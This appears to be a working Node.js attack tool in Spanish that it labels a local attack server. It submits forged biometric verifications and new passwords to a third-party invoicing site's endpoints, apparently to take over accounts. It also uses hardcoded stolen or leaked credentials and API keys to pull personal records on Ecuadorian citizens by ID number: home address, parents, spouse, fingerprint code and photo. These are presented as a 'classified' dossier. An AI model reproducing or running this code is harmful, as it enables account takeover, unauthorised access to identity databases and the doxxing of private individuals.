#!/usr/bin/env node
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const PORT = 3000;

let ultimaFotoBase64 = null;
let ultimaFotoIdentificacion = '';

const server = http.createServer((req, res) => {
  // 1. Servir los archivos estáticos de la interfaz
  if (req.method === 'GET' && !req.url.startsWith('/api/')) {
    if (req.url === '/foto') {
      if (!ultimaFotoBase64) {
        res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
        return res.end('<h3>No hay ninguna foto consultada recientemente</h3>');
      }
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(`
        <html>
          <head>
            <title>Retrato del Ciudadano - ${ultimaFotoIdentificacion}</title>
            <style>
              body {
                margin: 0;
                background-color: #0f172a;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                font-family: system-ui, -apple-system, sans-serif;
              }
              .card {
                background: rgba(30, 41, 59, 0.7);
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.1);
                padding: 30px;
                border-radius: 20px;
                box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
                text-align: center;
                max-width: 400px;
                width: 90%;
              }
              img {
                max-width: 100%;
                height: auto;
                border-radius: 12px;
                box-shadow: 0 8px 24px rgba(0,0,0,0.4);
                display: block;
                margin: 0 auto 20px;
                border: 2px solid rgba(255, 255, 255, 0.1);
              }
              h3 {
                color: #f1f5f9;
                margin: 0 0 8px;
                font-size: 1.5rem;
                font-weight: 600;
              }
              p {
                color: #94a3b8;
                margin: 0;
                font-size: 1rem;
              }
            </style>
          </head>
          <body>
            <div class="card">
              <img src="${ultimaFotoBase64.startsWith('data:') ? ultimaFotoBase64 : 'data:image/jpeg;base64,' + ultimaFotoBase64}" />
              <h3>Retrato del Ciudadano</h3>
              <p>Identificación: ${ultimaFotoIdentificacion || 'No disponible'}</p>
            </div>
          </body>
        </html>
      `);
      return;
    }

    let filePath = path.join(__dirname, req.url === '/' ? 'index.html' : req.url);

    const extname = String(path.extname(filePath)).toLowerCase();
    const mimeTypes = {
      '.html': 'text/html',
      '.js': 'text/javascript',
      '.css': 'text/css',
      '.json': 'application/json',
      '.png': 'image/png',
      '.jpg': 'image/jpg',
      '.gif': 'image/gif',
      '.svg': 'image/svg+xml'
    };

    const contentType = mimeTypes[extname] || 'application/octet-stream';

    fs.readFile(filePath, (error, content) => {
      if (error) {
        if(error.code == 'ENOENT') {
          res.writeHead(404, { 'Content-Type': 'text/html' });
          res.end('404 No Encontrado', 'utf-8');
        } else {
          res.writeHead(500);
          res.end('Error del Servidor: '+error.code+' ..\n');
          res.end();
        }
      } else {
        res.writeHead(200, { 'Content-Type': contentType });
        res.end(content, 'utf-8');
      }
    });
    return;
  }

  // 2. Endpoint API que recibe los datos de la interfaz y lanza el ataque
  if (req.method === 'POST' && req.url === '/api/attack') {
    let body = '';
    
    // Leer los datos enviados por la interfaz web
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', () => {
      try {
        const payload = JSON.parse(body);
        const token = payload.token;
        const foto = payload.foto;

        if (!token || !foto) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: 'Faltan datos' }));
        }

        // Empaquetar como formulario HTTP (igual que el navegador original)
        const postData = new URLSearchParams({ foto: foto, token: token }).toString();

        // Armar la petición hacia el servidor real (Disfraz)
        const attackReq = https.request({
          hostname: 'enext.online',
          path: '/factureroweb/admin/controller/emision/biometrico.php',
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(postData),
            'Referer': 'https://enext.online/factureroweb/public/biometria.php',
            'X-Requested-With': 'XMLHttpRequest'
          }
        }, (attackRes) => {
          let attackData = '';
          attackRes.on('data', chunk => attackData += chunk);
          attackRes.on('end', () => {
            // Devolver el resultado a nuestra interfaz web
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
              status: attackRes.statusCode,
              body: attackData
            }));
          });
        });

        attackReq.on('error', (e) => {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: e.message }));
        });

        attackReq.write(postData);
        attackReq.end();

      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Error procesando JSON' }));
      }
    });
    return;
  }

  // 3. Endpoint para descargar una imagen externa y retornarla en Base64 (evita CORS)
  if (req.method === 'POST' && req.url === '/api/download-image') {
    let body = '';
    req.on('data', chunk => body += chunk.toString());
    req.on('end', () => {
      try {
        const payload = JSON.parse(body);
        const imageUrl = payload.url;
        if (!imageUrl) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: 'Falta URL' }));
        }

        https.get(imageUrl, (imageRes) => {
          if (imageRes.statusCode !== 200) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'Error descargando la imagen externa' }));
          }

          const chunks = [];
          imageRes.on('data', (chunk) => chunks.push(chunk));
          imageRes.on('end', () => {
            const buffer = Buffer.concat(chunks);
            const contentType = imageRes.headers['content-type'] || 'image/jpeg';
            const base64 = `data:${contentType};base64,${buffer.toString('base64')}`;

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ base64: base64 }));
          });
        }).on('error', (e) => {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: e.message }));
        });
      } catch (err) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'JSON inválido' }));
      }
    });
    return;
  }

  // 4. Endpoint para enviar nueva contraseña a enext.online
  if (req.method === 'POST' && req.url === '/api/set-password') {
    let body = '';
    req.on('data', chunk => body += chunk.toString());
    req.on('end', () => {
      try {
        const payload = JSON.parse(body);
        const { token, newPass } = payload;

        if (!token || !newPass) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: 'Faltan campos token o newPass' }));
        }

        const postData = new URLSearchParams({ newPass, token }).toString();

        const passReq = https.request({
          hostname: 'enext.online',
          path: '/factureroweb/admin/controller/emision/actualzaPass.php',
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Content-Length': Buffer.byteLength(postData),
            'Referer': `https://enext.online/factureroweb/public/biometria.php?token=${token}`,
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://enext.online',
            'Accept': '*/*'
          }
        }, (passRes) => {
          let passData = '';
          passRes.on('data', chunk => passData += chunk);
          passRes.on('end', () => {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: passRes.statusCode, body: passData }));
          });
        });

        passReq.on('error', (e) => {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: e.message }));
        });

        passReq.write(postData);
        passReq.end();

      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'JSON inválido' }));
      }
    });
    return;
  }

  // Ruta no encontrada
  res.writeHead(404);
  res.end('Not Found');
});

server.listen(PORT, () => {
  console.log(`\n======================================================`);
  console.log(`🚀 SERVIDOR DE ATAQUE LOCAL INICIADO`);
  console.log(`👉 Abre tu navegador en: http://localhost:${PORT}`);
  console.log(`======================================================\n`);
  
  iniciarConsolaInteractiva();
});

// ========================================================================
// CONSULA INTERACTIVA EN TERMINAL
// ========================================================================
const readline = require('readline');

function iniciarConsolaInteractiva() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  const preguntarCedula = () => {
    rl.question('🔍 Ingrese una cédula para consultar (o "f" para abrir foto en navegador, Ctrl+C para salir): ', async (entrada) => {
      const input = entrada.trim();
      if (input.toLowerCase() === 'f') {
        if (ultimaFotoBase64) {
          console.log('\n🌐 Abriendo la última foto consultada en el navegador...');
          try {
            const startCommand = process.platform === 'win32' ? 'start ""' : process.platform === 'darwin' ? 'open' : 'xdg-open';
            exec(`${startCommand} http://localhost:${PORT}/foto`);
          } catch (err) {
            console.log(`❌ Error al intentar abrir el navegador: ${err.message}`);
          }
        } else {
          console.log('\n⚠️ No hay ninguna foto consultada recientemente para abrir.\n');
        }
      } else if (input !== '') {
        await consultarCedulaTerminal(input);
      }
      preguntarCedula();
    });
  };

  preguntarCedula();
}

function calcularEdadDetallada(fechaNacimientoStr) {
  if (!fechaNacimientoStr || fechaNacimientoStr === 'No disponible') return 'No disponible';
  
  // Asumiendo formato DD/MM/YYYY
  const partes = fechaNacimientoStr.split('/');
  if (partes.length !== 3) return 'No disponible';
  
  const diaNac = parseInt(partes[0], 10);
  const mesNac = parseInt(partes[1], 10) - 1;
  const anioNac = parseInt(partes[2], 10);
  
  const fechaNac = new Date(anioNac, mesNac, diaNac);
  const fechaHoy = new Date();
  
  if (isNaN(fechaNac.getTime())) return 'No disponible';
  
  let anios = fechaHoy.getFullYear() - fechaNac.getFullYear();
  let meses = fechaHoy.getMonth() - fechaNac.getMonth();
  let dias = fechaHoy.getDate() - fechaNac.getDate();
  
  if (dias < 0) {
    meses--;
    const ultimoDiaMesAnterior = new Date(fechaHoy.getFullYear(), fechaHoy.getMonth(), 0).getDate();
    dias += ultimoDiaMesAnterior;
  }
  
  if (meses < 0) {
    anios--;
    meses += 12;
  }
  
  return `${anios} AÑOS, ${meses} MESES, ${dias} DÍAS`;
}

async function consultarCedulaTerminal(cedula) {
  let tokenData = null;
  let cedulaData = null;
  let zampisoftData = null;
  let rucData = null;

  // 1. Consulta a Firmas Ecuador
  try {
    console.log(`\nObteniendo acceso al servidor 1...`);
    tokenData = await requestHttps({
      hostname: 'apifirmas.firmasecuador.com',
      path: '/api/auth/login',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*'
      }
    }, JSON.stringify({
      user: "1550239360",
      password: "Domenica99."
    }));

    if (tokenData && tokenData.token) {
      console.log(`🔍 Consultando servidor 1...`);
      cedulaData = await requestHttps({
        hostname: 'apifirmas.firmasecuador.com',
        path: '/api/usuarios/consultarCedula',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json, text/plain, */*',
          'x-token': tokenData.token
        }
      }, JSON.stringify({ cedula }));
    } else {
      console.log('❌ Error: No se pudo obtener acceso al servidor 1.');
    }
  } catch (err) {
    console.log(`❌ Error consultando servidor 1: ${err.message}`);
  }

  // 2. Consulta a Zampisoft
  try {
    console.log(`🔍 Consultando servidor 2...`);
    zampisoftData = await requestHttps({
      hostname: 'apiconsult.zampisoft.com',
      path: `/api/consultar?token=k8nP-uoKD-YUDe-i2rj&identificacion=${cedula}`,
      method: 'GET',
      headers: {
        'Accept': 'application/json, text/plain, */*'
      }
    });
  } catch (err) {
    console.log(`❌ Error consultando servidor 2: ${err.message}`);
  }

  // 3. Consulta a Supabase (Servidor 3 - RUC)
  try {
    console.log(`🔍 Consultando servidor 3...`);
    const rucPayload = JSON.stringify({ ruc: `${cedula}001` });
    const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVhcGNxY3V6ZmtwcW5nYnZqdG12Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTg4NTEzNzIsImV4cCI6MjA3NDQyNzM3Mn0.-mufqMzFQetktwAL444d1PjdWfdCC5-2ftVs0LnTIL4';
    rucData = await requestHttps({
      hostname: 'eapcqcuzfkpqngbvjtmv.supabase.co',
      path: '/functions/v1/consultar-ruc',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Authorization': `Bearer ${supabaseAnonKey}`,
        'Content-Length': Buffer.byteLength(rucPayload)
      }
    }, rucPayload);
  } catch (err) {
    console.log(`❌ Error consultando servidor 3: ${err.message}`);
  }

  // 4. Consolidar e Imprimir Resultados de forma Premium y Estructurada
  if (!cedulaData && (!zampisoftData || !zampisoftData.success) && !rucData) {
    console.log(`\n❌ Error: No se pudo obtener información de ningún servidor para la cédula: ${cedula}.\n`);
    return;
  }

  const nombre = ((zampisoftData && zampisoftData.nombre) || (cedulaData && cedulaData.nombres) || 'No disponible').toUpperCase();
  const identificacion = (cedulaData && cedulaData.identificacion) || (zampisoftData && zampisoftData.cedula) || cedula;
  const codigoDactilar = ((cedulaData && cedulaData.codigoDactilar) || 'No disponible').toUpperCase();
  const condicion = ((zampisoftData && zampisoftData.condicionCedulado) || 'No disponible').toUpperCase();
  const genero = ((zampisoftData && zampisoftData.genero) || (cedulaData && cedulaData.genero) || 'No disponible').toUpperCase();
  const estadoCivil = ((zampisoftData && zampisoftData.estadoCivil) || (cedulaData && cedulaData.estadoCivil) || 'No disponible').toUpperCase();
  const conyuge = ((zampisoftData && zampisoftData.conyuge) || 'Ninguno / No disponible').toUpperCase();

  const fechaNacimiento = (zampisoftData && zampisoftData.fechaNacimiento) || (cedulaData && cedulaData.fechaNacimiento) || 'No disponible';
  const lugarNacimiento = ((zampisoftData && zampisoftData.lugarNacimiento) || (cedulaData && cedulaData.lugarNacimiento) || 'No disponible').toUpperCase();
  const nacionalidad = ((zampisoftData && zampisoftData.nacionalidad) || (cedulaData && cedulaData.nacionalidad) || 'No disponible').toUpperCase();

  const lugarDomicilio = ((zampisoftData && zampisoftData.lugarDomicilio) || 'No disponible').toUpperCase();
  const calleDomicilio = ((zampisoftData && zampisoftData.calleDomicilio) || 'No disponible').toUpperCase();
  const numeracionDomicilio = ((zampisoftData && zampisoftData.numeracionDomicilio) || 'No disponible').toUpperCase();

  const nombrePadre = ((zampisoftData && zampisoftData.nombrePadre) || 'No disponible').toUpperCase();
  const nombreMadre = ((zampisoftData && zampisoftData.nombreMadre) || 'No disponible').toUpperCase();

  const instruccion = ((zampisoftData && zampisoftData.instruccion) || 'No disponible').toUpperCase();
  const profesion = ((zampisoftData && zampisoftData.profesion) || 'No disponible').toUpperCase();
  const rucSugerido = identificacion !== 'No disponible' ? `${identificacion}001` : 'No disponible';

  // Datos RUC consolidado
  const numeroRuc = (rucData && rucData.numero_ruc) || 'No disponible';
  const razonSocial = ((rucData && rucData.razon_social) || 'No disponible').toUpperCase();
  const estadoRuc = ((rucData && rucData.estado) || 'No disponible').toUpperCase();
  const actividadRuc = ((rucData && rucData.actividad) || 'No disponible').toUpperCase();
  const tipoRuc = ((rucData && rucData.tipo) || 'No disponible').toUpperCase();
  const regimenRuc = ((rucData && rucData.regimen) || 'No disponible').toUpperCase();
  const categoriaRuc = ((rucData && rucData.categoria) || 'No disponible').toUpperCase();
  const contabilidadRuc = ((rucData && rucData.obligado_contabilidad) || 'No disponible').toUpperCase();
  const agenteRetencionRuc = ((rucData && rucData.agente_retencion) || 'No disponible').toUpperCase();
  const especialRuc = ((rucData && rucData.contribuyente_especial) || 'No disponible').toUpperCase();
  const inicioActividadesRuc = (rucData && rucData.fecha_inicio_actividades) || 'No disponible';
  const fantasmaRuc = ((rucData && rucData.contribuyente_fantasma) || 'No disponible').toUpperCase();

  const red = '\x1b[31m';
  const redBold = '\x1b[31m\x1b[1m';
  const whiteBold = '\x1b[37m\x1b[1m';
  const gray = '\x1b[90m';
  const reset = '\x1b[0m';
  
  const delay = ms => new Promise(res => setTimeout(res, ms));

  console.log(`\n${redBold}┌────────────────────────────────────────────────────────┐${reset}`);
  console.log(`${redBold}│ ⛔ CLASIFICADO - SISTEMA DE INTELIGENCIA DE SEGURIDAD  │${reset}`);
  console.log(`${redBold}└────────────────────────────────────────────────────────┘${reset}`);
  
  await delay(120);
  console.log(`${gray}[SYS_INFO] Iniciando protocolo de descifrado...${reset}`);
  await delay(150);
  console.log(`${gray}[SYS_INFO] Servidor 1: ACCESS_GRANTED [SYS_PORT: 80-TCP]${reset}`);
  await delay(150);
  console.log(`${gray}[SYS_INFO] Servidor 2: ACCESS_GRANTED [SYS_PORT: 443-HTTPS]${reset}`);
  await delay(150);
  console.log(`${gray}[SYS_INFO] Servidor 3: ACCESS_GRANTED [SYS_PORT: 443-HTTPS]${reset}`);
  await delay(200);
  console.log(`${gray}[SYS_INFO] Volcando base de datos del ciudadano...${reset}\n`);
  await delay(250);

  console.log(`${redBold}[CLASSIFIED_INFO] ----------------------------------------------------${reset}`);
  console.log(`${gray}[TARGET_NAME]${reset}    : ${whiteBold}${nombre}${reset}`);
  console.log(`${gray}[REGISTRY_ID]${reset}    : ${whiteBold}${identificacion}${reset}`);
  console.log(`${gray}[DACTILAR_CODE]${reset}  : ${whiteBold}${codigoDactilar}${reset}`);
  console.log(`${gray}[STATUS]${reset}         : ${redBold}${condicion} [RESTRICTED]${reset}`);
  console.log(`${gray}[GENRE]${reset}          : ${whiteBold}${genero}${reset}`);
  console.log(`${gray}[MARITAL_STATUS]${reset}: ${whiteBold}${estadoCivil}${reset}`);
  console.log(`${gray}[SPOUSE]${reset}         : ${whiteBold}${conyuge}${reset}`);
  await delay(150);

  console.log(`\n${redBold}[BIRTH_RECORD] -------------------------------------------------------${reset}`);
  console.log(`${gray}[BIRTH_DATE]${reset}     : ${whiteBold}${fechaNacimiento}${reset}`);
  console.log(`${gray}[AGE]${reset}            : ${whiteBold}${calcularEdadDetallada(fechaNacimiento)}${reset}`);
  console.log(`${gray}[BIRTH_PLACE]${reset}    : ${whiteBold}${lugarNacimiento}${reset}`);
  console.log(`${gray}[CITIZENSHIP]${reset}    : ${whiteBold}${nacionalidad}${reset}`);
  await delay(150);

  console.log(`\n${redBold}[LOC_RECORD] ---------------------------------------------------------${reset}`);
  console.log(`${gray}[ADDRESS_ZONE]${reset}   : ${whiteBold}${lugarDomicilio}${reset}`);
  console.log(`${gray}[STREET]${reset}         : ${whiteBold}${calleDomicilio}${reset}`);
  console.log(`${gray}[HOUSE_NUMBER]${reset}   : ${whiteBold}${numeracionDomicilio}${reset}`);
  await delay(150);

  console.log(`\n${redBold}[FILIATION_DATA] -----------------------------------------------------${reset}`);
  console.log(`${gray}[FATHER_NAME]${reset}    : ${whiteBold}${nombrePadre}${reset}`);
  console.log(`${gray}[MOTHER_NAME]${reset}    : ${whiteBold}${nombreMadre}${reset}`);
  await delay(150);

  console.log(`\n${redBold}[INTEL_PROFILE] ------------------------------------------------------${reset}`);
  console.log(`${gray}[EDUCATION]${reset}      : ${whiteBold}${instruccion}${reset}`);
  console.log(`${gray}[PROFESSION]${reset}     : ${whiteBold}${profesion}${reset}`);
  console.log(`${gray}[TAX_REGISTER]${reset}   : ${redBold}${rucSugerido} [SUGGESTED]${reset}`);
  await delay(150);

  console.log(`\n${redBold}[RUC_RECORD] ---------------------------------------------------------${reset}`);
  console.log(`${gray}[TAX_ID]${reset}          : ${whiteBold}${numeroRuc}${reset}`);
  console.log(`${gray}[BUSINESS_NAME]${reset}   : ${whiteBold}${razonSocial}${reset}`);
  console.log(`${gray}[BUSINESS_STATUS]${reset} : ${redBold}${estadoRuc}${reset}`);
  console.log(`${gray}[BUSINESS_TYPE]${reset}   : ${whiteBold}${tipoRuc}${reset}`);
  console.log(`${gray}[TAX_REGIMEN]${reset}     : ${whiteBold}${regimenRuc}${reset}`);
  console.log(`${gray}[BUSINESS_CAT]${reset}    : ${whiteBold}${categoriaRuc}${reset}`);
  console.log(`${gray}[MAIN_ACTIVITY]${reset}   : ${whiteBold}${actividadRuc}${reset}`);
  console.log(`${gray}[ACCOUNTING_REQ]${reset}  : ${whiteBold}${contabilidadRuc}${reset}`);
  console.log(`${gray}[WITHHOLDING_AG]${reset}  : ${whiteBold}${agenteRetencionRuc}${reset}`);
  console.log(`${gray}[SPECIAL_CONT]${reset}    : ${whiteBold}${especialRuc}${reset}`);
  console.log(`${gray}[START_DATE]${reset}      : ${whiteBold}${inicioActividadesRuc}${reset}`);
  console.log(`${gray}[GHOST_CONT]${reset}      : ${redBold}${fantasmaRuc} [SRI_ALERT]${reset}`);
  console.log(`${redBold}----------------------------------------------------------------------${reset}`);
  await delay(200);

  if (cedulaData && cedulaData.foto) {
    ultimaFotoBase64 = cedulaData.foto;
    ultimaFotoIdentificacion = cedulaData.identificacion || cedula;
    console.log(`\n📸 ${redBold}FOTO ADJUNTA (Dossier Encontrado)${reset}`);
    try {
      const terminalImage = require('terminal-image').default;
      const base64Data = cedulaData.foto.replace(/^data:image\/\w+;base64,/, "");
      const buffer = Buffer.from(base64Data, 'base64');
      console.log('\nRetrato del ciudadano en terminal:');
      const renderedImage = await terminalImage.buffer(buffer, {width: 40});
      console.log(renderedImage);
    } catch (imgErr) {
      console.log(`❌ No se pudo dibujar la imagen en la terminal: ${imgErr.message}`);
    }
  } else {
    console.log(`\n📸 ${redBold}FOTO ADJUNTA:${reset} Archivo de imagen corrupto o no disponible en servidor 1.`);
  }
  console.log(`\n${redBold}======================================================================${reset}\n`);
}



function requestHttps(options, postData) {
  return new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          resolve(data); // Return as string if not JSON
        }
      });
    });

    req.on('error', (e) => reject(e));
    if (postData) {
      req.write(postData);
    }
    req.end();
  });
}
